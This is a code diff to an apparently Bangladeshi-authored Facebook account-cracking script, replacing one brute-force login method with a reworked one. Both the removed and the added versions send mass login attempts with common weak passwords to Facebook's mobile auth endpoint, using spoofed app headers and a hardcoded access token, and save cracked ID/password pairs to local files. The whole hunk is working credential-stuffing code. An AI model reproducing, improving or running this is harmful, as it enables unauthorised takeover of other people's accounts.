@@ -565,31 +565,68 @@ class _G_i_F_t_:
             if mthd in ['2','02']:
                 crack_submit.submit(__method__2,uid,total_ids)
 #-_-_-_-_-_-_-_-<-OLD-M->-_-_-_-_-_-_-_-#
-    def __method__1(uid,total_ids):
-        try:
-                global loop,oks
-                sys.stdout.write(f"\r\r\r\x1b[38;5;46m•\x1b[1;97m (\x1b[38;5;46m{hop(loop)}{A})\x1b[38;5;197m-{A}(\x1b[38;5;45m{loop}{A})\x1b[38;5;197m-{A}(\x1b[38;5;46m{len(oks)}{A}|\x1b[38;5;197m{len(cps)}{A})\x1b[38;5;197m-\x1b[1;97m(\x1b[38;5;46m{'{:.1%}'.format(loop/int(total_ids))}{A}) ");sys.stdout.flush()
-                for pw in ["123456","1234567","12345678","123456789","1234567890"]:
-                        random_seed = random.Random()
-                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":uid,"password":pw,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": __sex__(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
-                        url = 'https://graph.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print(f'\r\r\x1b[38;5;46m• {A}(\x1b[38;5;46mSUCCESS{A})\x1b[38;5;46m '+uid+f' {A}•\x1b[38;5;46m '+pw+'')
-                                        open('/sdcard/SABBIR-OLD-OK.txt','a').write(uid+' | '+pw+'\n')
-                                        oks.append(uid)
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        print(f'\r\r\x1b[38;5;46m• {A}(\x1b[38;5;46mSUCCESS{A})\x1b[38;5;46m '+uid+f' {A}•\x1b[38;5;46m '+pw+'')
-                                        open('/sdcard/HOP-D1-OLD-OK.txt','a').write(uid+' | '+pw+'\n')
-                                        oks.append(uid)
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
+    def _O_l_D_(self,ids):
+    	try:
+    	    global loop,oks,cps
+    	    coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
+    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}SABBIR-O1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
+    	    sys.stdout.flush()
+    	    for pas in ["123456","1234567","12345678","123456789","123123","143143"]:
+                data = {
+                'adid':str(uuid.uuid4()),
+                'format': 'json',
+                'device_id':str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id':str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password', 
+                'error_detail_type': 'button_with_disabled', 
+                'source': 'device_based_login', 
+                'email':str(ids),
+                'password':str(pas),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
+                'generate_session_cookies': '1', 
+                'meta_inf_fbmeta': '', 
+                'advertiser_id':str(uuid.uuid4()),
+                'currently_logged_in_userid': '0', 
+                'locale': 'en_US',
+                'client_country_code': 'US', 
+                'method': 'auth.login', 
+                'fb_api_req_friendly_name': 'authenticate', 
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
+                'api_key': '882a8490361da98702bf97a021ddc14d'}
+                headers = {
+                'User-Agent': self.__OLD__(),
+                'Content-Type': 'application/x-www-form-urlencoded', 
+                'Host': 'graph.facebook.com', 
+                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                'X-FB-Connection-Type': 'MOBILE.LTE', 
+                'X-Tigon-Is-Retry': 'False', 
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
+                'x-fb-device-group': '5120', 
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
+                'X-FB-Request-Analytics-Tags': 'graphservice', 
+                'X-FB-HTTP-Engine': 'Liger', 
+                'X-FB-Client-IP': 'True', 
+                'X-FB-Server-Cluster': 'True', 
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
+                'Content-Length': '706'}
+                url = "https://b-graph.facebook.com/auth/login"
+                po = requests.post(url,data=data,headers=headers).json()
+                if "session_key" in po:
+                    print(f"\r\r{vb}{G}/{W}>{B}sabbir-OK{W}< {vcv}{B} {ids}{G} / {B}{pas} \033[1;97m")
+                    open('/sdcard/sabbir-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
+                    self.oks.append(ids)
+                    break
+                elif 'www.facebook.com' in po['error']['message']:
+                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
+                    open('/sdcard/SABBIR-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
+                    self.cps.append(ids)
+                    break
+                else:continue
+    	    self.loop += 1
+    	except Exception as e:
+            pass
 #-_-_-_-_-_-_-_-<-UA-2->-_-_-_-_-_-_-_-#
     def __sex__():
     aV=str(random.choice(range(10,20)))
